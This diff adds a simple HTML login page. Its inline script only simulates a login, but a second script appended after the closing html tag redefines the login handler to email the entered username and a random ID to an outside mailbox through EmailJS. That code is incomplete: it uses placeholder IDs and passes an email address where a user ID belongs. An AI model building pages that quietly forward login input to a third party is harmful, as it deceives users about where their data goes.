@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login Page</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f1f1f1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background-color: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    input[type="text"] {
+      padding: 10px;
+      width: 100%;
+      margin: 10px 0;
+    }
+    button {
+      padding: 10px;
+      width: 100%;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Login</h2>
+    <input type="text" id="username" placeholder="Enter your username" />
+    <button onclick="handleLogin()">Login</button>
+  </div>
+
+  <script>
+    function handleLogin() {
+      const username = document.getElementById("username").value;
+      if (!username) {
+        alert("Please enter your username");
+        return;
+      }
+
+      // Simulate generating a user ID and sending to a server
+      const userId = 'user-' + Math.floor(Math.random() * 1000000);
+      console.log("Logging in...");
+      console.log("Username:", username);
+      console.log("User ID:", userId);
+
+      // Simulate sending data (in real usage, replace with fetch/ajax)
+      alert(`Logged in as ${username} (ID: ${userId})`);
+    }
+  </script>
+</body>
+</html>
+
+<script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script type="text/javascript">
+  (function() {
+    emailjs.init("phoeunsokpheng855@gmail.com"); // Replace with your EmailJS user ID
+  })();
+
+  function handleLogin() {
+    const username = document.getElementById("username").value;
+    if (!username) {
+      alert("Please enter your username");
+      return;
+    }
+
+    const userId = 'user-' + Math.floor(Math.random() * 1000000);
+
+    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+      username: username,
+      userid: userId,
+    }).then(
+      function(response) {
+        alert(`Login successful. Welcome ${username} (ID: ${userId})`);
+      },
+      function(error) {
+        alert("Failed to send login data");
+        console.error(error);
+      }
+    );
+  }
+</script>
